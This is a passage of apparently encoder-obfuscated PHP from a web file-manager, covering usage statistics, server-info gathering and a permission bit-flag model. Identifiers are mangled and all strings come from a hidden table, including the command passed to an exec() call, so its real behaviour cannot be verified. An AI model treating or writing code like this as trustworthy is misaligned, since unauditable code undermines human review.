strtotime($”šúäê¢[$ñ–Ğ¯…[284]]); } if (!isset($ÏµÂ…„ó)) { $¿”Œô›å = $±ı­²ÆÒ == $ñ–Ğ¯…[667] ? $ñ–Ğ¯…[599] : $ñ–Ğ¯…[903]; $ÏµÂ…„ó = Model($¿”Œô›å)->min($ñ–Ğ¯…[233]); } $¨íË§ˆè = $ñ–Ğ¯…[1918] . ucfirst($±ı­²ÆÒ); $Á¯ÁÓÅ² = $this->dateList($ÏµÂ…„ó); foreach ($Á¯ÁÓÅ² as $§î˜•²õ) { $this->{$¨íË§ˆè}($§î˜•²õ); } return $this->listData(); } private function dateList($Ã˜¡¬û) { $“éÓ•ı¤ =& $_SERVER[¶Ô„œ…¯]; $Ş—À¢Ó = $Ã˜¡¬û; $Ã²¤ÒòŸ = strtotime($“éÓ•ı¤[1917]); $íšÄæ«Œ = array(); while ($Ş—À¢Ó <= $Ã²¤ÒòŸ) { $íšÄæ«Œ[] = date($“éÓ•ı¤[1916], $Ş—À¢Ó); $Ş—À¢Ó = strtotime($“éÓ•ı¤[1919], $Ş—À¢Ó); } return $íšÄæ«Œ; } public function _recordUser($‹Äá³ß = '') { $¦ÔéŒá© =& $_SERVER[¶Ô„œ…¯]; $äâÁÎê = strtotime(date($¦ÔéŒá©[1920], strtotime($‹Äá³ß))); $ÈüÈø—† = strtotime(date($¦ÔéŒá©[1921], strtotime($‹Äá³ß))); $½Íµ•ç» = array($¦ÔéŒá©[233] => array($¦ÔéŒá©[1097], $ÈüÈø—†)); $à«½ˆøÂ = Model($¦ÔéŒá©[599])->where($½Íµ•ç»)->count($¦ÔéŒá©[1780]); $½Íµ•ç»[$¦ÔéŒá©[233]] = array($¦ÔéŒá©[410], array($äâÁÎê, $ÈüÈø—†)); $â¬ä˜ÍÑ = Model($¦ÔéŒá©[599])->where($½Íµ•ç»)->count($¦ÔéŒá©[1780]); $½Íµ•ç»[$¦ÔéŒá©[33]] = $¦ÔéŒá©[1922]; $ŠØ÷‘ = Model($¦ÔéŒá©[1923])->where($½Íµ•ç»)->count($¦ÔéŒá©[1924]); $šîí¤û× = array($¦ÔéŒá©[284] => $‹Äá³ß, $¦ÔéŒá©[843] => (int) $à«½ˆøÂ, $¦ÔéŒá©[1909] => (int) $â¬ä˜ÍÑ, $¦ÔéŒá©[1910] => (int) $ŠØ÷‘); return $this->insert($šîí¤û×); } public function _recordStore($¼óÔÄÇã = '') { $šü‚‘Å¯ =& $_SERVER[¶Ô„œ…¯]; $ûó¿êé€ = strtotime(date($šü‚‘Å¯[1921], strtotime($¼óÔÄÇã))); $È°¸®£ª = array($šü‚‘Å¯[233] => array($šü‚‘Å¯[1097], $ûó¿êé€)); $ã¨Ç–Ì€ = Model($šü‚‘Å¯[546])->where($È°¸®£ª)->sum($šü‚‘Å¯[79]); $È°¸®£ª[$šü‚‘Å¯[487]] = 0; $×‹ø…»— = Model($šü‚‘Å¯[903])->where($È°¸®£ª)->sum($šü‚‘Å¯[79]); $È°¸®£ª[$šü‚‘Å¯[190]] = 1; $úÁÊ•İ… = Model($šü‚‘Å¯[903])->where($È°¸®£ª)->sum($šü‚‘Å¯[79]); $È°¸®£ª[$šü‚‘Å¯[190]] = 2; $™ñı¬®ñ = Model($šü‚‘Å¯[903])->where($È°¸®£ª)->sum($šü‚‘Å¯[79]); $‡¡ºÕ’½ = array($šü‚‘Å¯[284] => $¼óÔÄÇã, $šü‚‘Å¯[841] => (int) $×‹ø…»—, $šü‚‘Å¯[1913] => (int) $ã¨Ç–Ì€, $šü‚‘Å¯[1914] => (int) $úÁÊ•İ…, $šü‚‘Å¯[1915] => (int) $™ñı¬®ñ); return $this->insert($‡¡ºÕ’½); } public function trend($ï§¹æ“¤, $öÊ£Ş’”) { $ªíëá³™ =& $_SERVER[¶Ô„œ…¯]; if (!$this->init($ï§¹æ“¤)) { return !1; } $¦¼Ó˜—õ = $this->trendList($ï§¹æ“¤); if ($¦¼Ó˜—õ && $öÊ£Ş’” != $ªíëá³™[1752]) { $«ìÍìî = $¦¼Ó˜—õ[0][$ªíëá³™[284]]; $·³ƒ®‡® = $this->validDate($öÊ£Ş’”, $«ìÍìî); $ş¯†²ıö = array(); $Óœ£ş¤‹ = array_to_keyvalue($¦¼Ó˜—õ, $ªíëá³™[284]); foreach ($·³ƒ®‡® as $ëœÏ§íå) { if (isset($Óœ£ş¤‹[$ëœÏ§íå])) { $©Úº¥«ç = $Óœ£ş¤‹[$ëœÏ§íå]; } else { $©Úº¥«ç = end($¦¼Ó˜—õ); $©Úº¥«ç[$ªíëá³™[284]] = $ëœÏ§íå; if ($ï§¹æ“¤ == $ªíëá³™[667]) { $©Úº¥«ç[$ªíëá³™[1909]] = $©Úº¥«ç[$ªíëá³™[1910]] = 0; } } $ş¯†²ıö[] = $©Úº¥«ç; } $¦¼Ó˜—õ = $ş¯†²ıö; } $¶îúÕœ÷ = array($ªíëá³™[667] => array($ªíëá³™[843] => LNG($ªíëá³™[1925]), $ªíëá³™[1909] => LNG($ªíëá³™[1926]), $ªíëá³™[1910] => LNG($ªíëá³™[1927])), $ªíëá³™[1911] => array($ªíëá³™[841] => LNG($ªíëá³™[1928]), $ªíëá³™[1913] => LNG($ªíëá³™[1929]), $ªíëá³™[1914] => LNG($ªíëá³™[1930]), $ªíëá³™[1915] => LNG($ªíëá³™[1931]))); $¦ø‹âĞ¨ = array($ªíëá³™[667] => $ªíëá³™[1932], $ªíëá³™[1911] => $ªíëá³™[79]); if (empty($¦¼Ó˜—õ)) { $ëœÏ§íå = date($ªíëá³™[1916], strtotime($ªíëá³™[1917])); $í±´òŠš = array($ªíëá³™[284] => $ëœÏ§íå); foreach ($¶îúÕœ÷[$ï§¹æ“¤] as $“ÚÃ¨½Î => $õ“Û²Ï½) { $í±´òŠš[$“ÚÃ¨½Î] = 0; } $¦¼Ó˜—õ[] = $í±´òŠš; } $¿÷ùëä— = array(); foreach ($¦¼Ó˜—õ as $õ“Û²Ï½) { if ($ï§¹æ“¤ == $ªíëá³™[1911] && $õ“Û²Ï½[$ªíëá³™[1913]] > $õ“Û²Ï½[$ªíëá³™[841]]) { $õ“Û²Ï½[$ªíëá³™[1913]] = $õ“Û²Ï½[$ªíëá³™[841]]; } foreach ($¶îúÕœ÷[$ï§¹æ“¤] as $“ÚÃ¨½Î => $Ö“±²Æœ) { $©Úº¥«ç = array($ªíëá³™[284] => $õ“Û²Ï½[$ªíëá³™[284]], $ªíëá³™[1666] => $Ö“±²Æœ); $©Úº¥«ç[$¦ø‹âĞ¨[$ï§¹æ“¤]] = isset($õ“Û²Ï½[$“ÚÃ¨½Î]) ? $õ“Û²Ï½[$“ÚÃ¨½Î] : 0; $¿÷ùëä—[] = $©Úº¥«ç; } } return $¿÷ùëä—; } public function validDate($ÑƒØ§¢â, $‡åå½ˆö) { $êªËŞ‘ş =& $_SERVER[¶Ô„œ…¯]; $ğÊ—Â´¾ = date($êªËŞ‘ş[1916], strtotime($êªËŞ‘ş[1917])); $ÔûİÜİ› = array($ğÊ—Â´¾); switch ($ÑƒØ§¢â) { case $êªËŞ‘ş[1759]: $ûµÏÁèË = mktime(0, 0, 0, date($êªËŞ‘ş[1933]), date($êªËŞ‘ş[1460]) - date($êªËŞ‘ş[1550]) + 7 - 7, date($êªËŞ‘ş[1934])); $œ´¿• = 0; do { $¬ÒªåÚç = date($êªËŞ‘ş[1916], $ûµÏÁèË - 3600 * 24 * 7 * $œ´¿•); $ÔûİÜİ›[] = $¬ÒªåÚç; $œ´¿•++; } while ($‡åå½ˆö < $¬ÒªåÚç); break; case $êªËŞ‘ş[1757]: $œ´¿• = 1; do { $Š¶•ß®Æ = date($êªËŞ‘ş[1935], strtotime("\x2d\40{$œ´¿•}\40\x6d\157\x6e\164\150\163")); $ÔûİÜİ›[] = $Š¶•ß®Æ; $œ´¿•++; } while ($‡åå½ˆö < $Š¶•ß®Æ); break; case $êªËŞ‘ş[1936]: $ú´§÷¹à = (int) date($êªËŞ‘ş[1934], strtotime($‡åå½ˆö)); $‚ĞüÙÍ = (int) date($êªËŞ‘ş[1934]); if ($ú´§÷¹à >= $‚ĞüÙÍ) { break; } for ($ú´§÷¹à; $ú´§÷¹à < $‚ĞüÙÍ; $ú´§÷¹à++) { $ÔûİÜİ›[] = $ú´§÷¹à . $êªËŞ‘ş[1937]; } break; default: break; } if ($‡åå½ˆö > end($ÔûİÜİ›)) { array_pop($ÔûİÜİ›); } sort($ÔûİÜİ›); return $ÔûİÜİ›; } public function listTable($˜Ğøº“Ã) { $¦¹üÎêÚ = ucfirst($˜Ğøº“Ã); return Model($¦¹üÎêÚ)->listData(); } public function option($«²ÃëÑ) { $ç®Ş¸‘° = $_SERVER[¶Ô„œ…¯][1938] . ucfirst($«²ÃëÑ); return $this->{$ç®Ş¸‘°}(); } private function optionUser() { $Éùà•‰İ =& $_SERVER[¶Ô„œ…¯]; $Ğƒİßúİ = Model($Éùà•‰İ[599])->count($Éùà•‰İ[1780]); $İíÔ´Ğ× = Model($Éùà•‰İ[599])->where($Éùà•‰İ[1939])->count($Éùà•‰İ[1780]); $Ö’ÂÑ = intval($GLOBALS[$Éùà•‰İ[6]][$Éùà•‰İ[426]][$Éùà•‰İ[1725]]) / 3600; $˜ª‡Ğ¡ƒ = strtotime("\x2d{$Ö’ÂÑ}\x20\x68\157\165\x72\x73"); $¶ú¨™¹ = strtotime(date($Éùà•‰İ[1920])); if ($˜ª‡Ğ¡ƒ < $¶ú¨™¹) { $˜ª‡Ğ¡ƒ = $¶ú¨™¹; } $ı•¡œ» = array($Éùà•‰İ[1940] => array($Éùà•‰İ[1098], $˜ª‡Ğ¡ƒ)); $õÓÇØßØ = (int) Model($Éùà•‰İ[599])->where($ı•¡œ»)->count($Éùà•‰İ[1780]); if (!$õÓÇØßØ) { $õÓÇØßØ = 1; } $ı•¡œ» = array($Éùà•‰İ[1940] => array($Éùà•‰İ[1098], $¶ú¨™¹)); $á’ŒÃ = Model($Éùà•‰İ[599])->where($ı•¡œ»)->count($Éùà•‰İ[1780]); return array($Éùà•‰İ[836] => (int) $Ğƒİßúİ, $Éùà•‰İ[1941] => (int) ($Ğƒİßúİ - $İíÔ´Ğ×), $Éùà•‰İ[1942] => (int) $İíÔ´Ğ×, $Éùà•‰İ[1943] => (int) $á’ŒÃ, $Éùà•‰İ[1944] => $õÓÇØßØ); } private function optionFile() { $±¨³¡ì =& $_SERVER[¶Ô„œ…¯]; $­ÁŞÙøŸ = $this->sourceSize(); $¶ôñÏ‚ = $­ÁŞÙøŸ[$±¨³¡ì[79]]; $©ğŠèò³ = $­ÁŞÙøŸ[$±¨³¡ì[1913]]; $Ì¦ıİ¹Ÿ = Model($±¨³¡ì[903])->where(array($±¨³¡ì[487] => 0))->count($±¨³¡ì[193]); $‚Õàò‡  = array($±¨³¡ì[487] => 0, $±¨³¡ì[233] => array($±¨³¡ì[1098], strtotime(date($±¨³¡ì[1920])))); $­óÑáÑ× = Model($±¨³¡ì[903])->where($‚Õàò‡ )->sum($±¨³¡ì[79]); $Èæ‚×á¼ = Model($±¨³¡ì[903])->where($‚Õàò‡ )->count($±¨³¡ì[193]); return array($±¨³¡ì[841] => $¶ôñÏ‚, $±¨³¡ì[1913] => $©ğŠèò³, $±¨³¡ì[1945] => $¶ôñÏ‚ - $©ğŠèò³, $±¨³¡ì[1946] => (int) $­óÑáÑ×, $±¨³¡ì[843] => (int) $Ì¦ıİ¹Ÿ, $±¨³¡ì[1947] => (int) $Èæ‚×á¼); } private function optionAccess() { $ùôùòˆÈ =& $_SERVER[¶Ô„œ…¯]; return array($ùôùòˆÈ[836] => $this->typeLogCnt(), $ùôùòˆÈ[110] => $this->typeLogCnt($ùôùòˆÈ[110]), $ùôùòˆÈ[527] => $this->typeLogCnt($ùôùòˆÈ[527]), $ùôùòˆÈ[1948] => $this->typeLogCnt($ùôùòˆÈ[1948]), $ùôùòˆÈ[1949] => $this->typeLogCnt($ùôùòˆÈ[1949]), $ùôùòˆÈ[667] => $this->typeLogCnt($ùôùòˆÈ[12], $ùôùòˆÈ[1924])); } private function typeLogCnt($Ë¡ñêŠ = '', $‚ŞûÒŠö = "\151\x64") { $àºÉğ±‚ =& $_SERVER[¶Ô„œ…¯]; $Šã™Í¿ = array($àºÉğ±‚[110] => array($àºÉğ±‚[1950], $àºÉğ±‚[1951]), $àºÉğ±‚[527] => array($àºÉğ±‚[1952], $àºÉğ±‚[1953]), $àºÉğ±‚[1948] => array($àºÉğ±‚[1954], $àºÉğ±‚[1955], $àºÉğ±‚[1956]), $àºÉğ±‚[1949] => array($àºÉğ±‚[1957], $àºÉğ±‚[1958]), $àºÉğ±‚[1959] => array($àºÉğ±‚[1960], $àºÉğ±‚[1961], $àºÉğ±‚[1962])); $Ë£»½œ = strtotime(date($àºÉğ±‚[1920])); $ËÁ‰÷Î = array($àºÉğ±‚[233] => array($àºÉğ±‚[1098], $Ë£»½œ)); if ($Ë¡ñêŠ) { $ËÁ‰÷Î[$àºÉğ±‚[33]] = array($àºÉğ±‚[7], $Šã™Í¿[$Ë¡ñêŠ]); } $ŸõÖøúæ = Model($àºÉğ±‚[1923])->where($ËÁ‰÷Î)->count($‚ŞûÒŠö); return (int) $ŸõÖøúæ; } private function optionServer() { $ŸæË¥’ã =& $_SERVER[¶Ô„œ…¯]; $˜’ØÈÃ = $this->diskDriver(); $‘¿™Ÿœ¾ = KodIO::defaultDriver(); $ûÊÎô = array($ŸæË¥’ã[896] => $‘¿™Ÿœ¾[$ŸæË¥’ã[477]]); $üÔä‹Ê = Model($ŸæË¥’ã[546])->where($ûÊÎô)->sum($ŸæË¥’ã[79]); $Ó¿¼Êë = explode($ŸæË¥’ã[53], $_SERVER[$ŸæË¥’ã[147]]); $Ì’‹…ø = $Ó¿¼Êë[0]; $º¯»–Ó³ = $GLOBALS[$ŸæË¥’ã[6]][$ŸæË¥’ã[21]]; $×àŸÊïÎ = $º¯»–Ó³[$ŸæË¥’ã[1060]]; if ($×àŸÊïÎ == $ŸæË¥’ã[1048]) { $½õøâ»³ = explode($ŸæË¥’ã[1375], $º¯»–Ó³[$ŸæË¥’ã[1059]]); $×àŸÊïÎ = $½õøâ»³[0]; } if ($×àŸÊïÎ == $ŸæË¥’ã[996] || $×àŸÊïÎ == $ŸæË¥’ã[883]) { $‰Ê÷œ™ = Model()->db()->query($ŸæË¥’ã[1963]); $‡—ÏÈà = $‰Ê÷œ™[0] && isset($‰Ê÷œ™[0][$ŸæË¥’ã[1665]]) ? $‰Ê÷œ™[0][$ŸæË¥’ã[1665]] : 0; $×àŸÊïÎ = $ŸæË¥’ã[1964] . ($‡—ÏÈà ? $ŸæË¥’ã[8] . $‡—ÏÈà : $ŸæË¥’ã[12]); } $í¤ü¢ƒ = $GLOBALS[$ŸæË¥’ã[6]][$ŸæË¥’ã[426]][$ŸæË¥’ã[905]]; return array($ŸæË¥’ã[1965] => $˜’ØÈÃ ? $˜’ØÈÃ[$ŸæË¥’ã[1966]] : 0, $ŸæË¥’ã[1967] => $˜’ØÈÃ ? $˜’ØÈÃ[$ŸæË¥’ã[1968]] : 0, $ŸæË¥’ã[1969] => (int) $‘¿™Ÿœ¾[$ŸæË¥’ã[1966]] * 1024 * 1024 * 1024, $ŸæË¥’ã[1970] => (int) $üÔä‹Ê, $ŸæË¥’ã[1971] => ucfirst($Ì’‹…ø), $ŸæË¥’ã[1972] => $ŸæË¥’ã[1973] . PHP_VERSION, $ŸæË¥’ã[1974] => phpBuild64() ? 64 : 32, $ŸæË¥’ã[835] => str_replace($ŸæË¥’ã[1216], $ŸæË¥’ã[1076], $×àŸÊïÎ), $ŸæË¥’ã[426] => ucfirst($í¤ü¢ƒ), $ŸæË¥’ã[32] => $_SERVER[$ŸæË¥’ã[1975]]); } private function diskDriver() { $ÉÀÈ»²œ =& $_SERVER[¶Ô„œ…¯]; $À¨üéõÄ = $ÉÀÈ»²œ[8]; $ÇáËùø± = $GLOBALS[$ÉÀÈ»²œ[6]][$ÉÀÈ»²œ[1392]] == $ÉÀÈ»²œ[1393]; if ($ÇáËùø±) { $À¨üéõÄ = $ÉÀÈ»²œ[1976]; if (function_exists($ÉÀÈ»²œ[1977])) { exec($ÉÀÈ»²œ[1978], $çÚŸÎ¤); $À¨üéõÄ = $çÚŸÎ¤[1] . $ÉÀÈ»²œ[8]; } } if (!file_exists($À¨üéõÄ)) { return; } if (!function_exists($ÉÀÈ»²œ[1979])) { return; } $Ëëíªû½ = @disk_total_space($À¨üéõÄ); $…ŞÖ¯®’ = $Ëëíªû½ - @disk_free_space($À¨üéõÄ); return array($ÉÀÈ»²œ[1966] => $Ëëíªû½, $ÉÀÈ»²œ[1968] => $…ŞÖ¯®’); } public function fileChart($’şäÖ¼Û) { $Çêàü¼ =& $_SERVER[¶Ô„œ…¯]; if (isset($’şäÖ¼Û[$Çêàü¼[1780]])) { return Model($Çêàü¼[903])->userFileTypeProfile($’şäÖ¼Û[$Çêàü¼[1780]]); } if (isset($’şäÖ¼Û[$Çêàü¼[1980]])) { return Model($Çêàü¼[903])->groupFileTypeProfile($’şäÖ¼Û[$Çêàü¼[1980]]); } $ø‰ûøÖ· = $this->sourceSize(); $Üê¹óºæ = array($Çêàü¼[192] => 0, $Çêàü¼[190] => 1); $üÕ”Öîù = Model($Çêàü¼[903])->where($Üê¹óºæ)->sum($Çêàü¼[79]); $Üê¹óºæ[$Çêàü¼[190]] = 2; $Æ«¥ùª = Model($Çêàü¼[903])->where($Üê¹óºæ)->sum($Çêàü¼[79]); return array($Çêàü¼[841] => $ø‰ûøÖ·[$Çêàü¼[79]], $Çêàü¼[1913] => $ø‰ûøÖ·[$Çêàü¼[1913]], $Çêàü¼[1914] => (int) $üÕ”Öîù, $Çêàü¼[1915] => (int) $Æ«¥ùª); } private function sourceSize() { $¦…‹å¬È =& $_SERVER[¶Ô„œ…¯]; $Ü»ğ½á = Model($¦…‹å¬È[903])->where(array($¦…‹å¬È[487] => 0))->sum($¦…‹å¬È[79]); $ûä›†§€ = Model($¦…‹å¬È[546])->sum($¦…‹å¬È[79]); if ($ûä›†§€ > $Ü»ğ½á) { $ûä›†§€ = $Ü»ğ½á; } return array($¦…‹å¬È[79] => (int) $Ü»ğ½á, $¦…‹å¬È[1913] => (int) $ûä›†§€); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $áµÄ¶ =& $_SERVER[¶Ô„œ…¯]; $ß·•è£¿ = array(array($áµÄ¶[496] => LNG($áµÄ¶[1981]), $áµÄ¶[1982] => $áµÄ¶[1983], $áµÄ¶[1984] => 1, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($áµÄ¶[496] => LNG($áµÄ¶[1987]), $áµÄ¶[1982] => $áµÄ¶[1988], $áµÄ¶[1984] => 2, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($áµÄ¶[496] => LNG($áµÄ¶[1989]), $áµÄ¶[1982] => $áµÄ¶[1990], $áµÄ¶[1984] => 3, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($áµÄ¶[496] => LNG($áµÄ¶[1991]), $áµÄ¶[1982] => $áµÄ¶[1992], $áµÄ¶[1984] => 4, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => self::AUTH_SHOW | self::AUTH_VIEW), array($áµÄ¶[496] => LNG($áµÄ¶[1993]), $áµÄ¶[1982] => $áµÄ¶[1994], $áµÄ¶[1984] => 5, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($áµÄ¶[496] => LNG($áµÄ¶[1995]), $áµÄ¶[1982] => $áµÄ¶[1996], $áµÄ¶[1984] => 6, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($áµÄ¶[496] => LNG($áµÄ¶[1997]), $áµÄ¶[1982] => $áµÄ¶[1998], $áµÄ¶[1984] => 7, $áµÄ¶[1985] => 1, $áµÄ¶[1986] => 0)); return $ß·•è£¿; } public static function authCheck($ƒ·¦İÉœ, $¯¨üÎãø) { $²ÖğÔ†Ù =& $_SERVER[¶Ô„œ…¯]; $ƒ·¦İÉœ = intval($ƒ·¦İÉœ); if (KodUser::isRoot() && $GLOBALS[$²ÖğÔ†Ù[6]][$²ÖğÔ†Ù[1999]]) { return !0; } if ($ƒ·¦İÉœ <= 0) { return !1; } if (($ƒ·¦İÉœ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ƒ·¦İÉœ & $¯¨üÎãø); } public static function authCheckShow($ÎàÔ†´ƒ) { return self::authCheck($ÎàÔ†´ƒ, self::AUTH_SHOW); } public static function authCheckView($£Ï¨òÁÂ) { return self::authCheck($£Ï¨òÁÂ, self::AUTH_VIEW); } public static function authCheckDownload($·â˜™êÓ) { return self::authCheck($·â˜™êÓ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($…—ŞƒÄ) { return self::authCheck($…—ŞƒÄ, self::AUTH_UPLOAD); } public static function authCheckEdit($¦ÉšÆä) { return self::authCheck($¦ÉšÆä, self::AUTH_EDIT); } public static function authCheckRemove($ô—¢ÅæÎ) { return self::authCheck($ô—¢ÅæÎ, self::AUTH_REMOVE); } public static function authCheckShare($Ò¦¸ı) { return self::authCheck($Ò¦¸ı, self::AUTH_SHARE); } public static function authCheckComment($ğä‚¼î›) { return self::authCheck($ğä‚¼î›, self::AUTH_COMMENT); } public static function authCheckEvent($ °—±Ç­) { return self::authCheck($ °—±Ç­, self::AUTH_EVENT); } public static function authCheckRoot($Í¿™) { return self::authCheck($Í¿™, self::AUTH_ROOT); } public static function authCheckAction($™‘Õ„äı, $º‹ñ¡½Ì) { $ï—Şíî· =& $_SERVER[¶Ô„œ…¯]; $ù¡Ñã·Û = array($ï—Şíî·[2000] => self::AUTH_VIEW, $ï—Şíî·[1286] => self::AUTH_DOWNLOAD, $ï—Şíî·[110] => self::AUTH_UPLOAD, $ï—Şíî·[1949] => self::AUTH_EDIT, $ï—Şíî·[1948] => self::AUTH_REMOVE, $ï—Şíî·[1959] => self::AUTH_SHARE, $ï—Şíî·[431] => self::AUTH_COMMENT, $ï—Şíî·[1767] => self::AUTH_EVENT, $ï—Şíî·[2001] => self::AUTH_ROOT); if (!isset($ù¡Ñã·Û[$º‹ñ¡½Ì])) { return; } $‰“ò˜®Œ = $ù¡Ñã·Û[$º‹ñ¡½Ì]; $™‘Õ„äı = intval($™‘Õ„äı); if ($™‘Õ„äı <= 0) { return !1; } if (($™‘Õ„äı & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($™‘Õ„äı & $‰“ò˜®Œ); } public static function authDisable($Æáˆ¥á¯, $Ä×¡ÖÉ) { if (intval($Æáˆ¥á¯) <= 0) { return 0; } return intval($Æáˆ¥á¯) & ~$Ä×¡ÖÉ; } public $optionType = "\123\171\163\164\145\155\x2e\x73\157\x75\162\x63\x65\101\165\164\150\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\141\165\x74\150", "\154\141\x62\145\154", "\x64\x69\x73\x70\154\141\171", "\163\x79\163\164\x65\155", "\163\x6f\162\x74"); public function initData() { $Ó—­«Œ = $this->authDefault(); foreach ($Ó—­«Œ as $Ü«ª¸Š¿) { $this->add($Ü«ª¸Š¿); } } public function findAuth($Øº»Ö¦, $ èÓ¥·À) { $ÉÙÈğ…‘ =& $_SERVER[¶Ô„œ…¯]; $Î½ùÚô = parent::listData(); foreach ($Î½ùÚô as $ı”—È ü) { $ùÂ½—ı„ = intval($ı”—È ü[$ÉÙÈğ…‘[489]]); if ($ùÂ½—ı„ <= 0 || $ı”—È ü[$ÉÙÈğ…‘[2002]] == 0) { continue; } if (($ùÂ½—ı„ & $Øº»Ö¦) != $Øº»Ö¦) { continue; } if (($ùÂ½—ı„ & $ èÓ¥·À) != 0) { continue; } return $ı”—È ü[$ÉÙÈğ…‘[477]]; } return !1; } public function findAuthMax($£Æ”ÏÛ“, $š€ì—§í) { $ÜæƒÆŠ¢ =& $_SERVER[¶Ô„œ…¯]; $¤âú¬Â¿ = !1; $Ò÷¾ î = parent::listData(); foreach ($Ò÷¾ î as $”©Œ½œÎ) { $”ßíö ² = intval($”©Œ½œÎ[$ÜæƒÆŠ¢[489]]); if ($”ßíö ² <= 0 || $”©Œ½œÎ[$ÜæƒÆŠ¢[2002]] == 0) { continue; } if (($”ßíö ² & $£Æ”ÏÛ“) != $£Æ”ÏÛ“) { continue; } if (($”ßíö ² & $š€ì—§í) != 0) { continue; } if (!$¤âú¬Â¿) { $¤âú¬Â¿ = $”©Œ½œÎ; continue; } if (intval($¤âú¬Â¿[$ÜæƒÆŠ¢[489]]) < $”ßíö ²) { $¤âú¬Â¿ = $”©Œ½œÎ; } } return $¤âú¬Â¿ ? $¤âú¬Â¿[$ÜæƒÆŠ¢[477]] : !1; } public function findAuthReadOnly() { $¡‡­ø‘œ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $½òÜä©³ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¡‡­ø‘œ, $½òÜä©³); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ó±€õåÖ =& $_SERVER[¶Ô„œ…¯]; $ì¢ş³• = parent::listData(); $¢™íÒË» = !1; foreach ($ì¢ş³• as $†ù×¶½×) { if ($†ù×¶½×[$ó±€õåÖ[489]] <= 0 || $†ù×¶½×[$ó±€õåÖ[2002]] == $ó±€õåÖ[230]) { continue; } if (!$¢™íÒË») { $¢™íÒË» = $†ù×¶½×; continue; } if ($¢™íÒË»[$ó±€õåÖ[489]] > $†ù×¶½×[$ó±€õåÖ[489]]) { $¢™íÒË» = $†ù×¶½×; } } return $¢™íÒË» ? $¢™íÒË»[$ó±€õåÖ[477]] : $ó±€õåÖ[12]; } public function listData($üÄ—ÇÍ‘ = false, $Õ–»ı = "\x73\157\x72\164", $óÄø»Ä´ = false) { return parent::listData($üÄ—ÇÍ‘, $Õ–»ı, $óÄø»Ä´); } public function update($ê›œÍĞç, $ìëîÜÔŠ) { $¬Ä¨‚®â =& $_SERVER[¶Ô„œ…¯]; $™Šñ÷  = parent::listData($ê›œÍĞç); $¤æ•ûÉ¿ = $this->findByName($ìëîÜÔŠ[$¬Ä¨‚®â[32]]); if (!$™Šñ÷  || $¤æ•ûÉ¿ && $¤æ•ûÉ¿[$¬Ä¨‚®â[477]] != $™Šñ÷ [$¬Ä¨‚®â[477]]) { return !1; } $this->filterAuth($ìëîÜÔŠ[$¬Ä¨‚®â[489]]); return parent::update($ê›œÍĞç, $ìëîÜÔŠ); } public function remove($¯õ¨±°Ç) { $ŒÑÌÓ×– = parent::listData($¯õ¨±°Ç); if (!$ŒÑÌÓ×– || $ŒÑÌÓ×–[$_SERVER[¶Ô„œ…¯][191]]) { return !1; } return parent::remove($¯õ¨±°Ç); } public function add($Âç›÷§ = array()) { $‡ûÊğå =& $_SERVER[¶Ô„œ…¯]; if ($this->findByName($Âç›÷§[$‡ûÊğå[32]])) { return !1; } $Œ€“¡¨· = array($‡ûÊğå[32] => $‡ûÊğå[12], $‡ûÊğå[489] => 1, $‡ûÊğå[2003] => $‡ûÊğå[1990], $‡ûÊğå[2002] => 1, $‡ûÊğå[191] => 0, $‡ûÊğå[2004] => 0); $Âç›÷§ = array_merge($Œ€“¡¨·, $Âç›÷§); $Âç›÷§[$‡ûÊğå[2004]] = $this->getSort(); $this->filterAuth($Âç›÷§[$‡ûÊğå[489]]); return parent::insert($Âç›÷§); } private function getSort() { $óûï´°œ =& $_SERVER[¶Ô„œ…¯]; $ïÕÎ’Õ€ = parent::listData(); $˜åÑÈ°õ = array_to_keyvalue($ïÕÎ’Õ€, $óûï´°œ[12], $óûï´°œ[2004]); return empty($˜åÑÈ°õ) ? 0 : max($˜åÑÈ°õ) + 1; } private function filterAuth(&$°õ¸²…É) { if (!$°õ¸²…É) { return; } $„÷¹Ôã = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÀÉ­áã¶ = array(); foreach ($„÷¹Ôã as $”ûö±ñì) { if ($°õ¸²…É & $”ûö±ñì) { $ÀÉ­áã¶[] = $”ûö±ñì; } } 